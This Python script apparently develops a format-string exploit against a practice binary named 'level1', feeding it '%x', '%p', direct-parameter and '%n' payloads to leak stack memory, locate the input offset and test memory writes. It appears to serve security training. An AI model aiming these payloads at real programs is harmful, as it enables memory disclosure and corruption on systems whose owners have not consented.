#!/usr/bin/env python3
"""
Level1 Format String Exploit
"""

import struct
import subprocess
import sys

def send_input(program, username, password):
    """Send input to the program and capture output"""
    try:
        process = subprocess.Popen(
            [program],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        output, error = process.communicate(input=f"{username}\n{password}\n")
        return output, error, process.returncode
    except Exception as e:
        print(f"Error: {e}")
        return None, None, -1

def test_basic_format_string():
    """Test basic format string vulnerability"""
    print("=== Testing Basic Format String ===")
    
    # Test with format specifiers
    payloads = [
        "%x%x%x%x",
        "%08x.%08x.%08x.%08x",
        "AAAA.%08x.%08x.%08x.%08x.%08x.%08x",
        "%p.%p.%p.%p.%p.%p"
    ]
    
    for payload in payloads:
        print(f"\nTesting payload: {payload}")
        output, error, retcode = send_input("./level1", "dat_wil", payload)
        if output:
            print(f"Output: {output}")
            print(f"Return code: {retcode}")

def find_stack_offset():
    """Find where our input appears on the stack"""
    print("\n=== Finding Stack Offset ===")
    
    # Create a unique pattern
    pattern = "AAAA"  # 0x41414141
    payload = f"{pattern}.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x"
    
    print(f"Testing pattern: {pattern}")
    output, error, retcode = send_input("./level1", "dat_wil", payload)
    
    if output:
        print(f"Output: {output}")
        # Look for 0x41414141 in the output
        if "41414141" in output:
            print("Found our pattern in output!")
        else:
            print("Pattern not found, trying more offsets...")

def test_direct_parameter_access():
    """Test direct parameter access with %n$x"""
    print("\n=== Testing Direct Parameter Access ===")
    
    for i in range(1, 20):
        payload = f"%{i}$x"
        print(f"Testing %{i}$x")
        output, error, retcode = send_input("./level1", "dat_wil", payload)
        if output:
            print(f"Output: {output.strip()}")

def test_memory_write():
    """Test writing to memory with %n"""
    print("\n=== Testing Memory Write ===")
    
    # Test writing to a safe location first
    payload = "%7$n"  # Write to 7th parameter
    print(f"Testing payload: {payload}")
    output, error, retcode = send_input("./level1", "dat_wil", payload)
    if output:
        print(f"Output: {output}")

def main():
    """Main exploit development function"""
    print("Level1 Format String Exploit Development")
    print("=" * 50)
    
    # Step 1: Basic format string test
    test_basic_format_string()
    
    # Step 2: Find stack offset
    find_stack_offset()
    
    # Step 3: Test direct parameter access
    test_direct_parameter_access()
    
    # Step 4: Test memory write
    test_memory_write()
    
    print("\n=== Exploit Development Complete ===")
    print("Check the output above to determine:")
    print("1. Stack layout and offsets")
    print("2. Memory addresses leaked")
    print("3. Safe locations to write to")

if __name__ == "__main__":
    main() 